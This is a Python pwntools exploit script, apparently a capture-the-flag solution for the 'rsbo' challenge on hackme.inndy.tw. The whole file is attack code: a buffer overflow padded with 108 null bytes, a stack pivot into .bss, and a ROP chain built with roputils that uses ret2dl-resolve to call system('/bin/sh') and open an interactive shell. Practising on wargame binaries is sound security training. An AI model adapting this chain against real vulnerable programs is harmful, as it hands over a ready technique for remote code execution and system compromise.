from pwn import *
import roputils as rp
import time

p=process('./rsbo-01c51ca9a7b9db3d69289c6dbb1cd758')
#p=remote('hackme.inndy.tw',7706)
e=ELF('./rsbo-01c51ca9a7b9db3d69289c6dbb1cd758')
context.log_level='debug'

bss=e.bss()+0x800
rop=rp.ROP('./rsbo-01c51ca9a7b9db3d69289c6dbb1cd758')
p4ret=0x804879C
pebp=0x804879F

payload='\x00'*108+p32(0x804865C)+p32(pebp)+p32(bss)+p32(0x8048733)  #stack_pivot
raw_input()
p.send(payload)

time.sleep(1)


rop_data='a'*4+rop.call('read',0,bss+180,0x80)+rop.dl_resolve_call(bss+200,bss+180)
rop_data += rop.fill(0x7f,rop_data)
raw_input()
p.sendline(rop_data)

time.sleep(1)
bss_data='/bin/sh\x00'
bss_data += rop.fill(20,bss_data)
bss_data += rop.dl_resolve_data(bss+200,'system')
bss_data += rop.fill(0x80,bss_data)
raw_input()
p.send(bss_data)
p.interactive()
